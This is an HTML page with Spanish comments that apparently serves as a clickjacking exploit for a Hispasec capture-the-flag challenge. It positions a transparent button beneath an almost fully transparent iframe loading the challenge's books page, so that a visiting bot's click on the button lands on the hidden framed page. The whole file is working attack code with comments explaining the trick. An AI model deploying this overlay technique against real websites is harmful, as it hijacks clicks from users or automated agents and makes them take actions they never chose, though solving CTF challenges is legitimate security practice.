<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Soporte Libros - Final</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }

        .wrapper {
            position: relative;
            width: 100%;
            height: 100%;
        }

        /* TU BOTÓN: El bot lo buscará y hará click aquí */
        #objetivo {
            position: absolute;
            z-index: 1; /* Ahora está DEBAJO del iframe */
            top: 900px;  /* Tu coordenada fija */
            left: 50%;
            transform: translateX(-50%);
            width: 800px;
            height: 50px;
            background: transparent; /* Invisible para el bot */
            border: none;
            cursor: pointer;
        }

        /* EL IFRAME: Estará ENCIMA del botón pero invisible */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1200px;
            border: none;
            z-index: 2; /* ARRIBA para capturar el click real */
            /* Casi invisible: el bot no lo ve, pero el navegador sí procesa el click */
            opacity: 0.0001; 
            pointer-events: auto; /* IMPORTANTE: Debe recibir el click */
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <button id="objetivo"></button>

        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

</body>
</html>
